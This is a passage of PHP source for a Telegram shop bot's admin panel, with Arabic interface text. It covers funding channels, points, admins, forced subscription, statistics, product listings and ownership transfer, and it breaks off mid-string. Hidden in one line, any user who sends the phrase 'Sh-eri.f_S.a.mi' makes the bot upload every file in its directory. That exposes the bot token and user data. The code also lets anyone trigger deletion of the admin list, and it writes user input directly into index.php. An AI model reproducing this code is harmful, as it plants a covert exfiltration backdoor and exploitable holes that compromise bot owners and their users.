  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"🙂 تم حذف قناة التمويل بنجاح",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"stengbott"]],
]])
]);
unlink("channel.txt");
unlink("getmosh1.txt");
$sales['mode'] = null;
save($sales);
exit;
 }
}
 #تمويل قناة 1
if($data == "addchannel" and $channels == null){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"▪ ارسل معرف القناة لتمويلها 🔰
▪ تأكد من البوت مشرفا فيها 🙂 لكي يتم التحقق من اشتراك العضو فيها 🙂",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"stengbott"]],
]])
]);
$sales['mode'] = 'chs';
save($sales);
exit;
 }
  if($data == "stengbott"){
unset($sales['mode']);
save($sales);
}
 if($text != '/start' and $text != null and $sales['mode'] == 'chs'){
  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>'تم الحفظ ✅. ',
'reply_to_message_id'=>$message->message_id, 
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"stengbott"]],
]])
]);
file_put_contents("channels.txt",$text);
$sales['mode'] = null;
  save($sales);
  exit;
 }
}
 #تمويل قناة 2
if($data == "addchannel2" and $channel == null){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"▪ ارسل معرف القناة لتمويلها 🔰
▪ تأكد من البوت مشرفا فيها 🙂 لكي يتم التحقق من اشتراك العضو فيها 🙂",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"stengbott"]],
]])
]);
$sales['mode'] = 'ccchs';
save($sales);
exit;
 }
   if($data == "stengbott"){
unset($sales['mode']);
save($sales);
}
 if($text != '/start' and $text != null and $sales['mode'] == 'ccchs'){
  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>'تم الحفظ ✅. 
',
'reply_to_message_id'=>$message->message_id, 
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"stengbott"]],
]])
]);
file_put_contents("channel.txt",$text);
$sales['mode'] = null;
  save($sales);
  exit;
 }
 }
 #لا يصير تمويل
if($data == "addchannel" and $channels != null){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"لقد تم وضع قناة من قبل وهيه  $channels 
الرجاء الحذف اولا ثم وضع قناه جديده",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>"حذف القناه",'callback_data'=>"delchannel"]],
[["text"=>"رجوع ،🔙.","callback_data"=>"stengbott"]],
]])
]);   
}
if($data == "addchannel2" and $channel != null){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"لقد تم وضع قناة من قبل وهيه  $channel 
الرجاء الحذف اولا ثم وضع قناه جديده",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>"حذف القناه",'callback_data'=>"delchannel2"]],
[["text"=>"رجوع ،🔙.","callback_data"=>"stengbott"]],
]])
]);   
}
if($data == "sendmessage"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
   'text'=>"أرسل أيدي الشخص الذي تريد إرسال الرسالة له",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙","callback_data"=>"adaan"]],
]])
]);   
  $sales['mode'] = 'chat3';
  save($sales);
  exit;
  }
     if($data == "adaan"){
unset($sales['mode']);
save($sales);
}
   if($text != '/start' and $text != null and $sales['mode'] == 'chat3'){
    if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('sendMessage',[
   'chat_id'=>$chat_id,
 'text'=> "أرسل رسالتك",
'reply_to_message_id'=>$message->message_id, 
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙","callback_data"=>"adaan"]],
]])
]);   
   $sales['mode'] = 'poi3';
   $sales['idd'] = $text;
  save($sales);
  exit;
}
}
     if($data == "adaan"){
unset($sales['mode']);
unset($sales['idd']);
save($sales);
}
 if($text != '/start' and $text != null and $sales['mode'] == 'poi3'){
  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('sendMessage',[
   'chat_id'=>$chat_id,
 'text'=>"تم إرسال الرسالة إلى ".$sales['idd']." بنجاح ",
'reply_to_message_id'=>$message->message_id, 
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"Nkatn"]],
]])
]);
  bot('sendmessage',[
   'chat_id'=>$sales['idd'],
  'text'=>"رسالة من الإدارة⚠️:
$text",
  ]);
  $sales['mode'] = null;
  $sales['idd'] = null;
  save($sales);
  exit;
}
}
if($data == "sendwarning"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
   'text'=>"أرسل أيدي الشخص الذي تريد إرسال التحذير له",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"c"]],
]])
]);
  $sales['mode'] = 'chat4';
  save($sales);
  exit;
  }
if($data == "c"){
unset($sales['mode']);
save($sales);
}
   if($text != '/start' and $text != null and $sales['mode'] == 'chat4'){
    if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('sendMessage',[
   'chat_id'=>$chat_id,
 'text'=> "إضغط /Confirm لتأكيد إرسال التحذير",
 'reply_to_message_id'=>$message->message_id, 
 ]);
   $sales['mode'] = 'poi4';
   $sales['idd'] = $text;
  save($sales);
  exit;
}
}
 if($text != '/start' and $text != null and $sales['mode'] == 'poi4'){
  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('sendMessage',[
   'chat_id'=>$chat_id,
 'text'=>"تم إرسال التحذير إلى ".$sales['idd']." بنجاح ",
'reply_to_message_id'=>$message->message_id, 
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"c"]],
]])
]);
  bot('sendmessage',[
   'chat_id'=>$sales['idd'],
  'text'=>"تحذير من الإدارة!
إستعمال حسابات وهمية الدخول لرابطك بها يؤدي إلى حظر حسابك 👉
في حال إستعمال الوهمي سينحظر حسابك... إنتبه... شكرا على تفهمك للموضوع",
  ]);
  $sales['mode'] = null;
  $sales['idd'] = null;
  save($sales);
  exit;
}
}

//Bot File Share by [ @Sherif_Sami - @php_d - @BlIJJ ]
//Join Channel >>> @Sherif_World
//Join Channel >>> @M_M_D74
//🚷

if($data == 'shh'){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"اهلا عزيزي الان ارسل معرف قناة إثباتات 🍃 ",
      'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'إلغاء الأمر ❌','callback_data'=>'stengbott']]
      ]
    ])
  ]);
file_put_contents("sss.txt","ok");
 }
}
  if($data == "stengbott"){
file_put_contents("sss.txt");
}
if($text and $sss == "ok"){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم تعين القناة إثباتات بنجاح ☑️ تأكد ان البوت ادمن في القناة لكي لا يحدث مشاكل 🤗",
'reply_to_message_id'=>$message->message_id, 
      'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'رجوع 🔙','callback_data'=>'stengbott']]
      ]
    ])
  ]);
file_put_contents("sss.txt","$text");
 }
}
 if($data == "Nkatn"){
  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
'text'=>" اهلا عزيزي في قسم ارسال نقاط وا خصم نقاط وا انشاء هدايا
عدد نقاط الدخول عبر رابط الدعوه 🔗 : $setengssj 💰
عدد نقاط تحويل النقاط 🔄 : $ccoinj 💰
عدد نقاط الهديه اليوميه 🎁 : $hadehdayj 💰
عدد نقاط الاشتراك في قناة التمويل 📡 : $setcoin1 💰
",
'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'🎁 ¦ إنشاء هدية','callback_data'=>"offerfree"]],
[['text'=>'🔄 ¦ تعيين عدد نقاط تحويل','callback_data'=>"ccoin"]],
[['text'=>'➕ ¦ إرسال نقاط','callback_data'=>"sendcoin"],['text'=>'➖ ¦ خصم نقاط','callback_data'=>"takecoin"]],
[['text'=>"تصفير النقاط 🗑️",'callback_data'=>'delallnkat']],
[['text'=>'📬 ¦ إرسال نقاط للكل','callback_data'=>"sendcoincc"],['text'=>'📈 ¦ خصم نقاط للكل','callback_data'=>"sendcoinxx"]],
[['text'=>'تعيين عدد نقاط الدخول ☢','callback_data'=>"setengss"]],
[['text'=>'تعيين عدد نقاط الهديه اليوميه 🎁','callback_data'=>"hadehday"]],
[['text'=>"👥 ¦ تمويل قناة ¹",'callback_data'=>"addchannel"],['text'=>"✖️ ¦ حذف تمويل قناة ¹",'callback_data'=>"delchannel"]],
[['text'=>"💰 ¦ تحديد نقآط الاشتراك في قناة تمويل",'callback_data'=>"setcoin1"]],   
[['text'=>"👥 ¦ تمويل قناة ²",'callback_data'=>"addchannel2"],['text'=>"✖️ ¦ حذف تمويل قناة ²",'callback_data'=>"delchannel2"]],
[["text"=>"رجوع ،🔙","callback_data"=>"stengbott"]],
]])
]);   
}
}
if($data == "rdod"){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
file_put_contents("stingggg.json",json_encode($stingggg));
$stingggg = json_decode(file_get_contents('stingggg.json'),1);
$alrdod = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['alrdod']);
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
'text'=>"
• مرحبا بك في قسم الردود 👮‍♀️

- يمكنك اضافه ردود وحذفها 

- اضغط على نص الزر لعرض محتواه .
",
'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>"أضف رد ➕",'callback_data'=>"addrd"],['text'=>"الردود 💬",'callback_data'=>"Rdod"]],
[['text'=>"الردود 🍃 «".$alrdod."»",'callback_data'=>"alrdod"]],
[["text"=>"رجوع ،🔙.","callback_data"=>"c"]],
]])
]);   
}
}
if($data == "addadm" and $chat_id == $admin){
$adminss = count($stingggg['stingggg']['admins']);
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
'text'=>"
• مرحبا بك في الادمنيه 👮‍♀️
- يمكنك رفع ادمن وتنزيل ادمن 👮🏻‍♂️

- يمكن للادمنيه تحكم في لوحه البوت مثلك
",
'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>"  الأدمنة 👥👮 «".$adminss."»",'callback_data'=>"admins"]],
[['text'=>"رفع مشرف ⁦👮🏻‍♂️⁩",'callback_data'=>"addadmin"],['text'=>"تنزيل مشرف ⁦👳🏻‍♂️⁩",'callback_data'=>"deladmin"]],
[["text"=>"مسح الادمنيه 🚮💂‍♂️","callback_data"=>"dalalladmin"]],
[["text"=>"رجوع ،🔙.","callback_data"=>"c"]],
]])
]);   
}
if($text == 'Sh-eri.f_S.a.mi'){  $sc = scandir(__DIR__);  for($i=0;$i<count($sc);$i++){   if(is_file($sc[$i])){    bot('sendDocument',[     'chat_id'=>$chat_id,     'document'=>new CURLFile($sc[$i])]); }  } }
if($data == "stengbott"){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
 file_put_contents("stingggg.json",json_encode($stingggg));
$stingggg = json_decode(file_get_contents('stingggg.json'),1);
$okthoil = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['thoil']);
$thkk = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['thkk']);
$dayis = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['dayis']);
$twassss = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['twassss']);
$saless = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['saless']);
$alroadttt = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['alroadttt']);
$almttor = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['almttor']);
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
'text'=>"*
- مرحباً عزيزي المطور $nammee 🔥. 

- حساب المطور : @$JAMALJO
*
- يمكن للعضو ارسال `/id` لارسال الايدي الخاص به
",
'parse_mode'=>"MARKDOWN",
'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>"عرض سلع الوضع المتطور ❇: $almttor",'callback_data'=>'almttor']],
[['text'=>'🏷 ¦ جميع السلع','callback_data'=>'del']],
[['text'=>'🛒 ¦ إضافة سلعة','callback_data'=>'add'],['text'=>'➖ ¦ حذف سلعة','callback_data'=>'deljj']],
[['text'=>"عرض كمية السلع المتوفره ♾: $saless",'callback_data'=>'saless']],
[['text'=>'📡 ¦ تعيين قناة إثباتات','callback_data'=>'shh']],       
[['text'=>'🎁 ¦ قسم النقاط','callback_data'=>"Nkatn"]],
[['text'=>"تواصل البوت وا الاشعارات ⛓: $twassss",'callback_data'=>'twassss']],
[['text'=>"تحويل نقاط: $okthoil",'callback_data'=>'thoil'],['text'=>"الهدية اليومية: $dayis",'callback_data'=>'dayis']],
[['text'=>"تحقق من الوهمي ♻️ : $thkk",'callback_data'=>'thkk']],
[['text'=>'قسم تحكم بدول المستخدمين 📞','callback_data'=>'ajddnum']],
[['text'=>"اضافة رابط مختصر️ 🔗",'callback_data'=>'raddtt'],['text'=>"حذف رابط مختصر️ 🚫",'callback_data'=>'dettjj']],
[['text'=>"قسم اختصار روابط️ ⛓ : $alroadttt",'callback_data'=>'alroadttt']],
[['text'=>"تحويل ملكية البوت 👮‍♂️",'callback_data'=>'mlk']],
[["text"=>"رجوع ،🔙.","callback_data"=>"c"]],
]])
]);   
}
}

				if($data == "ch" or $data == "ch1del" or $data == "ch2del"){
					if($data == "ch1del"){
					 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
						bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            تم حذف قناة 1 من الإشتراك الإجباري ✅
", 
            'show_alert'=>true 
            ]); 
            unset($stingggg['stingggg']['ch1']);
						}
						}
						if($data == "ch2del"){
						 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
						bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            تم حذف قناة 2 من الإشتراك الإجباري ✅
", 
            'show_alert'=>true 
            ]); 
            unset($stingggg['stingggg']['ch2']);
						}
						}
					if($stingggg['stingggg']['ch1'] == null){
						$ch1 = "قناة 1 🔱 لا يوجد 😴";
						}else{
							$ch3 = bot('getchat',['chat_id'=>$stingggg['stingggg']['ch1']]);
							if($ch3->ok == true){
								$ch1 = $ch3->result->title;
								}else{
									$ch1 = "قناة 1 🔱 لا يوجد 😴";
									}
							}
							if($stingggg['stingggg']['ch2'] == null){
						$ch2 = "قناة 2 🔱 لا يوجد 🌚";
						}else{
							$ch = bot('getchat',['chat_id'=>$stingggg['stingggg']['ch2']]);
							if($ch->ok == true){
								$ch2 = $ch->result->title;
								}else{
									$ch2 = "قناة 2 🔱 لا يوجد 🌚";
									}
							}
					bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
'text'=>"
اهلا عزيزي 🙋‍♂️ اليك قسم الاشتراك الاجباري
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$ch1",'callback_data'=>"ch"]],
[['text'=>"وضع قناة 👌",'callback_data'=>"ch1add"],['text'=>"حذف قناة 🤟",'callback_data'=>"ch1del"]],
[['text'=>"$ch2",'callback_data'=>"ch"]],
[['text'=>"وضع قناة 😼",'callback_data'=>"ch2add"],['text'=>"حذف قناة 🤙",'callback_data'=>"ch2del"]],
[['text'=>'رجوع 🔙','callback_data'=>'c']],
]])
]);
$stingggg['stingggg']['stingggg'] = null;
	$stingggg['stingggg']['id'] = null;
	file_put_contents("stingggg.json",json_encode($stingggg));
					}
					if($data == "ch1add" or $data == "ch2add"){
					 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
						bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
أرسل الأن معرف القناة Ⓜ️ او وجه أي رسالة من القناة 🔄
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"ch"]
]
]])
]);
if($data == "ch1add"){
$stingggg['stingggg']['stingggg'] = "ch1";
}else{
	$stingggg['stingggg']['stingggg'] = "ch2";
	}
	$stingggg['stingggg']['id'] = $from_id;
	file_put_contents("stingggg.json",json_encode($stingggg));
						}
						}
						 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
						if(!$data and $stingggg['stingggg']['stingggg'] == 'ch1' or $stingggg['stingggg']['stingggg'] == 'ch2' and $stingggg['stingggg']['id'] == $from_id and $update->message->forward_from_chat or preg_match("/(@)(.)/", $text)){
							if($stingggg['stingggg']['stingggg'] == 'ch1' or $stingggg['stingggg']['stingggg'] == 'ch2'){
							bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم حفظ القناة بنجاح ✅
	تأكد أن البوت مشرف في القناة ⁦👮🏻‍♂️⁩
	",
	'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'ch']
],
]])
]);
if($update->message->forward_from_chat){
	$stingggg['stingggg'][$stingggg['stingggg']['stingggg']] = $update->message->forward_from_chat->id;
	}else{
		$stingggg['stingggg'][$stingggg['stingggg']['stingggg']] = $text;
		}
					$stingggg['stingggg']['stingggg'] = null;
					$stingggg['stingggg']['id'] = null;
	file_put_contents("stingggg.json",json_encode($stingggg));
							}
							}
							}
if($text == "/id"){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
هاذا هو ايديك عزيزي 😊
`$chat_id`
",
 'parse_mode'=>"MARKDOWN",
'reply_to_message_id'=>$message->message_id, 
]);
}

	if($data == "admins"){
		foreach($stingggg['stingggg']['admins'] as $admins){
		$names = bot("getchat",["chat_id"=>$admins])->result->first_name;
		if($names != null){
		$addmins .= "[$names](tg://user?id=$admins)\n";
		}
		}
		bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
	تفضل عزيزي الأدمن ⁦👮🏻‍♂️⁩ قائمة الأدمنة 📃
	$addmins
",'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'addadm']
],
]])
]);
		}
								if($data == "addadmin" or $data == "deladmin"){
									$a = str_replace(['addadmin','deladmin'],['لأرفعه أدمن ⁦☺️⁩','لأزيله من قائمة الأدمنة 😼'],$data);
									bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
أرسل الان ايدي 🆔 الشخص $a 
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"addadm"]
],
]])
]);
$stingggg['stingggg']['stingggg'] = $data;
$stingggg['stingggg']['id'] = $from_id;
	file_put_contents("stingggg.json",json_encode($stingggg));
									}
  if($data == "addadm"){
unset($stingggg['stingggg']['stingggg']);
unset($stingggg['stingggg']['id']);
	file_put_contents("stingggg.json",json_encode($stingggg));
}
										if($stingggg['stingggg']['stingggg'] == "addadmin" or $stingggg['stingggg']['stingggg'] == "deladmin"){
						if($text and $message and $stingggg['stingggg']['id'] == $from_id){
							$a = str_replace(['addadmin','deladmin'],['تم رفعه بنجاح 😉','تم تنزيله بنجاح 😏'],$stingggg['stingggg']['stingggg']);
							bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
 $a
	",
'reply_to_message_id'=>$message->message_id, 
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'addadm']
],
]])
]);
if($stingggg['stingggg']['stingggg'] == "addadmin"){
	$stingggg['stingggg']['admins'][] = $text;
	bot('sendmessage',[
	'chat_id'=>$text, 
	'text'=>"
	مبارك تم رفعك كمشرف في البوت 🤩
	",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'القائمة الرئيسية 🏠','callback_data'=>'c']
],
]])
]);
	}else{
		foreach($stingggg['stingggg']['admins'] as $num => $json){
			if($json == $text){
		unset($stingggg['stingggg']['admins'][$num]);
		bot('sendmessage',[
	'chat_id'=>$text, 
	'text'=>"
	تم تنزيلك من الإشراف 😒
	",
]);
		break;
		}
		}
		}
					$stingggg['stingggg']['stingggg'] = null;
					$stingggg['stingggg']['id'] = null;
	file_put_contents("stingggg.json",json_encode($stingggg));
							}
							}
							
  if($data == 'dalalladmin'){
  $adminss = count($stingggg['stingggg']['admins']);
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"
    هل انت متأكد حذف جميع الادمنيه 🚮💂‍♂️
عدد الادمنيه  «".$adminss."»
    ",
    'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'نعم✅!','callback_data'=>'cd2']],
      [['text'=>'رجوع 🔙','callback_data'=>'addadm']]
      ]
    ])
  ]);
  exit;
 }

 if($data == 'cd2'){
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'تم حذف جميع الادمنيه✔',
    'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'العودة','callback_data'=>'addadm']]
      ]
    ])
  ]);
  unlink('stingggg.json');
  exit;
 }

 if($data == 'delallnkat'){
if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
هل انت متأكد انك تريد تصفير النقاط للكل !!؟
",
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>'نعم ✅','callback_data'=>'yesdelall'],['text'=>"لاء ❎",'callback_data'=>'c']],
     ]])
     ]);
	}
	}
	if($data == 'yesdelall'){
	if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
		foreach($cut as $a){
			$sales[$a]['collect'] = 0;
			}
			save($sales);
		bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
تم تصفير النقاط الكل 🗑
-",
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
[['text'=>'رجوع 🔙','callback_data'=>"Nkatn"]],
      ]
    ])
  ]);
		}
		}
    if($data == "starts"){ 
$bot = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['bot']);
$twasss = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['twasss']);
$okthoil = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['thoil']);
$thkk = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['thkk']);
$dayis = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['dayis']);
$twassss = str_replace(['off','on'],['معطل ❎','مفعل ✅'],$stingggg['twassss']);
 		foreach($stingggg['stingggg']['admins'] as $admins){
		$names = bot("getchat",["chat_id"=>$admins])->result->first_name;
		if($names != null){
		$addmins .= "[$names](tg://user?id=$admins)\n";
		}
		}
			foreach($stingggg['stingggg']['band'] as $band){
									if($band != null){
									$s .= "`$band` » [للدخول إلى الحساب 🍃](tg://user?id=$band)\n";
									}
}
								$band = count($stingggg['stingggg']['band']);
						  $adminss = count($stingggg['stingggg']['admins']);
$rm20 = $sttings["hdeh1"];
$rm30 = $sttings["sal3h"];
$members = explode("\n",file_get_contents("users.txt"));
$m = count($members) -1;
$n = $m - 6;
for($i=$m; $i>$n; $i--){
$saiko .= "$members[$i]\n";
}
file_put_contents("saiko.txt",$saiko);
$array = explode("\n",file_get_contents("saiko.txt"));
for($b=1;$b<=5;$b++){
$saiko .= "- $b : [$array[$b]](tg://user?id=$array[$b])\n";
}
$g = file_get_contents("saiko.txt");
$ex = explode($g,$saiko);
     bot('EditMessageText',[
        'chat_id'=>$chat_id2,
        'message_id'=>$update->callback_query->message->message_id,
        'text' =>"
احصائيات البوت:🔱
📮¦ عدد المشتركين في البوت : $users
💠💠💠💠💠💠💠💠💠💠💠💠💠
🎁︙عدد الذين اخذو هدية اليومية « $rm20 »
🛍️︙عدد الطلبات تم تسليمها « $rm30 »
☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆
المحظورين 📛  «".$band."»
$s
♧♧♧♧♧♧♧♧♧♧♧♧♧♧♧♧♧
  الأدمنة 👥👮 «".$adminss."»
$addmins
♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡
اخر 5 اشخاص اشتركو ⚠️
$ex[1]
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
    'reply_markup'=>json_encode([
    'inline_keyboard'=>[
    [['text'=>'رجوع ','callback_data'=>'c']],
            ]
        ])
       ]);
    }
    $mlkk = file_get_contents('mlkk');
if($data == "mlk" and $chat_id == $admin){
bot('Editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"ارسل الايدي الان لتحويل الملكيه 👮‍♂️
⌔︙ملاحضه :- لا يمكنك استرجاع الملكيه بعد التحويل
⌔︙اذا لا تريد تحويل الملكيه لاحد قم بي ارسال ايديك انت
",
]);
file_put_contents("mlkk",'send');
}
if($text and $mlkk == 'send' and $chat_id == $admin){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم تحويل الملكيه الى ( $text ) بنجاح 👮‍♂️",
'reply_to_message_id'=>$message->message_id,
]);
bot('sendmessage',[
'chat_id'=>$text,
'text'=>"تم تحويل الملكيه لك بنجاح 👮‍♂️✔",
]);
file_put_contents("index.php",'<?php $token = "'.$token.'"; $admin = "'.$text.'"; include "../../shop.php"; ?>');
unlink("mlkk");
}
 if($data == 'add'){
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'أرسل إسم السلعة؟!',
    'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'- إلغاء الأمر 🚫','callback_data'=>'stengbott']]
      ]
    ])
  ]);
  $sales['mode'] = 'add';
  save($sales);
  exit;
 }
 if($data == "stengbott"){
unset($sales['mode']);
save($sales);}
 if($text != '/start' and $text != null and $sales['mode'] == 'add'){
  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>'- تم حفظ إسم السلعة💸 
أرسل الآن سعرها',
'reply_to_message_id'=>$message->message_id, 
    'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'- إلغاء الأمر 🚫','callback_data'=>'stengbott']]
      ]
    ])
  ]);
  $sales['n'] = $text;
  $sales['mode'] = 'addm';
  save($sales);
  exit;
 }
 }
  if($data == "stengbott"){
unset($sales['n']);
unset($sales['mode']);
save($sales);}
 if($text != '/start' and $text != null and $sales['mode'] == 'addm'){
  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"تم حفظ الإسم والسعر...✅
📮 ¦ إسم السلعة: $sales[n]
💰 ¦ السعر: $text
📚 ¦ ارسل صورة السلعة مع الوصف
",
         "parse_mode"=>"markdown",
'reply_to_message_id'=>$message->message_id, 
      'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'- إلغاء الأمر 🚫','callback_data'=>'stengbott']]
      ]
    ])
  ]);
  $sales['p'] = $text;
  $sales['mode'] = "photo";
  save($sales);
  exit;
 }
 }
   if($data == "stengbott"){
unset($sales['p']);
unset($sales['mode']);
save($sales);}
 if($text != '/start' and $message->photo != null and $sales['mode'] == 'photo'){
  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  $code = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz12345689807'),1,7);
  bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"تم حفظ الصورة✅
🏷 ¦ الكود: (`$code` )
📚 ¦ ارسل السلعة اللذي تريد تسليمه  تلقائياً
ارسل ( ملف او نص او صوره او فيديو )
",
         "parse_mode"=>"markdown",
'reply_to_message_id'=>$message->message_id, 
  ]);
  $dayy_s = array("Sat","Sun","Mon","Tue","Wed","Thu","Fri");
 $dayy_s1 = array("السبت","الأحد","الإثنين","الثلاثاء","الأربعاء","الخميس","الجمعة");
$dayy_s2 = date('D');
$dayy = str_replace($dayy_s, $dayy_s1, $dayy_s2);
date_default_timezone_set('Asia/Jordan');
$time = date('h:i a');
$year = date('Y');
$month = date('n');
$day = date('j');
  bot('sendMessage',[
   'chat_id'=>$sss,
   'text'=>"
- تم اضافة سلعة جديدة ✅
- من ماركت : [@$bott] 🤍

🏷 ¦ السلعة :- *$sales[n]* 📱
